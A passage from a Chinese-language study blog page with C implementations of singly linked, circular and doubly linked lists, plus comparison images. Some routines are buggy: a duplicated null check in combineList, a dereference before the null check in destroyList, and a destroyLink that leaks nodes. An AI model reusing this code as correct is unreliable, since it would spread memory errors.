class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *linkList;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList *headNode)</span>;<br><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode = <span class="hljs-literal">NULL</span>;<br>    initList(&amp;headNode);<br>    printfNode(headNode);<br>    destroyList(headNode);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status <span class="hljs-title function_">initList</span><span class="hljs-params">(linkList* headNode)</span> &#123;<br>    (*headNode)=(linkList)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span>((*headNode)==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    (*headNode)-&gt;next=<span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date=<span class="hljs-string">&#x27;0&#x27;</span>;<br>    node* moveNode=(*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node* temNode=(node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;next=<span class="hljs-literal">NULL</span>;<br>        temNode-&gt;date=<span class="hljs-string">&#x27;A&#x27;</span>+i;<br>        moveNode-&gt;next=temNode;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">//打印</span><br>status <span class="hljs-title function_">printfNode</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">if</span> (headNode-&gt;next == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-comment">//删除，包括头节点</span><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode;<br>    node *deleteNode;<br>    moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (moveNode != <span class="hljs-literal">NULL</span>) &#123;<br>        num++;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h3><ol><li><p>最后一个节点指向首节点</p></li><li><p>因为没有最后一个节点为空，所以我们在遍历的时候，我们需要判断等不等于头节点</p></li><li><p>使用尾指针更加的方便（更快的操作末节点，头节点和<code>a1</code>）</p></li><li><p>简单的代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; node, *circularLinkList;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span>;<br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span>;<br><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    circularLinkList headNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList headNode2 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode1 = <span class="hljs-literal">NULL</span>;<br>    circularLinkList tailNode2 = <span class="hljs-literal">NULL</span>;<br>    tailNode1 = initList(&amp;headNode1);<br>    tailNode2 = initList(&amp;headNode2);<br>    printfList(headNode1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    combineList(tailNode1,tailNode2);<br>    printfList(headNode1);<br>    destroyList(headNode1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//将链表2接在链表一的后面，且保留链表一的头节点</span><br>status <span class="hljs-title function_">combineList</span><span class="hljs-params">(circularLinkList tailNode1, circularLinkList tailNode2)</span> &#123;<br>    <span class="hljs-keyword">if</span> (tailNode1 == <span class="hljs-literal">NULL</span> || tailNode1 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = tailNode1-&gt;next;<br>    tailNode1-&gt;next = tailNode2-&gt;next-&gt;next;<br>    <span class="hljs-built_in">free</span>(tailNode2-&gt;next);<br>    tailNode2-&gt;next=<span class="hljs-literal">NULL</span>;<br>    tailNode2-&gt;next = temNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">printfList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;date);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">destroyList</span><span class="hljs-params">(circularLinkList headNode)</span> &#123;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        deleteNode = moveNode;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>circularLinkList <span class="hljs-title function_">initList</span><span class="hljs-params">(circularLinkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;date = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    <span class="hljs-type">char</span> a;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    node *moveNode = (*headNode);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;date = a + i;<br>        temNode-&gt;next = <span class="hljs-literal">NULL</span>;<br>        moveNode-&gt;next = temNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    <span class="hljs-keyword">return</span> moveNode;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><ol><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType char</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> &#123;</span><br>    ElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prior</span>;</span><br>&#125; node, *linkList;<br><br><br>status <span class="hljs-title function_">insertNode</span><span class="hljs-params">(linkList headNode, ElemType data, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    temNode-&gt;data = data;<br>    node *moveNode = headNode;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = temNode;<br>    temNode-&gt;next = moveNode-&gt;next;<br>    temNode-&gt;prior = moveNode;<br>    moveNode-&gt;next = moveNode-&gt;next-&gt;prior;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getLinkLength</span><span class="hljs-params">(linkList headNode)</span>&#123;<br>    <span class="hljs-keyword">if</span>(headNode==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;<br>    node* moveNode=headNode-&gt;next;<br>    <span class="hljs-keyword">while</span>(moveNode!=headNode)&#123;<br>        moveNode=moveNode-&gt;next;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><br>status <span class="hljs-title function_">deleteNode</span><span class="hljs-params">(linkList headNode, <span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || sub &lt; <span class="hljs-number">1</span>||sub%getLinkLength(headNode)==<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;deleteNode ERROR\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (--sub) &#123;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next-&gt;prior = moveNode-&gt;prior;<br>    moveNode-&gt;prior-&gt;next = moveNode-&gt;next;<br>    <span class="hljs-built_in">free</span>(moveNode);<br>    moveNode=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">insertLink</span><span class="hljs-params">(linkList headNode, linkList insertHeadNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span> || insertHeadNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *temNode = headNode;<br>    headNode-&gt;prior-&gt;next = insertHeadNode-&gt;next;<br>    insertHeadNode-&gt;next-&gt;prior = headNode-&gt;prior;<br>    headNode-&gt;prior = insertHeadNode-&gt;prior;<br>    headNode-&gt;prior-&gt;next = headNode;<br>    <span class="hljs-built_in">free</span>(insertHeadNode);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">destroyLink</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    node *deleteNode = moveNode;<br>    <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        moveNode = moveNode-&gt;next;<br>        <span class="hljs-built_in">free</span>(deleteNode);<br>        deleteNode = <span class="hljs-literal">NULL</span>;<br>        num++;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, num);<br>    headNode = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">initLinkList</span><span class="hljs-params">(linkList *headNode)</span> &#123;<br>    (*headNode) = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>    <span class="hljs-keyword">if</span> ((*headNode) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-type">char</span> a;<br>    (*headNode)-&gt;data = <span class="hljs-string">&#x27;0&#x27;</span>;<br>    (*headNode)-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*headNode)-&gt;prior = <span class="hljs-literal">NULL</span>;<br>    node *moveNode = (*headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a=&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%c&quot;</span>, &amp;a);<br>    getchar();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; ++i) &#123;<br>        node *temNode = (node *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(node));<br>        temNode-&gt;data = a + i;<br>        moveNode-&gt;next = temNode;<br>        moveNode-&gt;next-&gt;prior = moveNode;<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    moveNode-&gt;next = (*headNode);<br>    moveNode-&gt;next-&gt;prior = moveNode;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeACW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;prior;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;prior;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br>status <span class="hljs-title function_">printNodeCW</span><span class="hljs-params">(linkList headNode)</span> &#123;<br>    <span class="hljs-keyword">if</span> (headNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    node *moveNode = headNode-&gt;next;<br>    <span class="hljs-keyword">while</span> (moveNode != headNode) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %c &quot;</span>, moveNode-&gt;data);<br>        moveNode = moveNode-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    linkList headNode;<br>    linkList headNode2;<br>    initLinkList(&amp;headNode);<br>    initLinkList(&amp;headNode2);<br>    printNodeCW(headNode);<br>    printNodeACW(headNode);<br><br>    insertLink(headNode, headNode2);<br>    printNodeCW(headNode);<br><br>    insertNode(headNode, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-number">54</span>);<br>    printNodeCW(headNode);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    deleteNode(headNode,<span class="hljs-number">55</span>);<br>    printNodeCW(headNode);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%d\n&quot;</span>, getLinkLength(headNode));<br><br>    destroyLink(headNode);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="不同链表的比较"><a href="#不同链表的比较" class="headerlink" title="不同链表的比较"></a>不同链表的比较</h3><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%A4%9A%E7%A7%8D%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="多种链表的比较"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%93%BE%E5%BC%8F%E5%AD%98%E5%82%A8%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="链式存储的优点"></p><p>  <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png"></p></li></ol><h3 id="线性表的应用"><a href="#线性表的应用" class="headerlink" title="线性表的应用"></a>线性表的应用</h3><ol><li><p>有序表的合并</p><ul><li><p>线性表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span 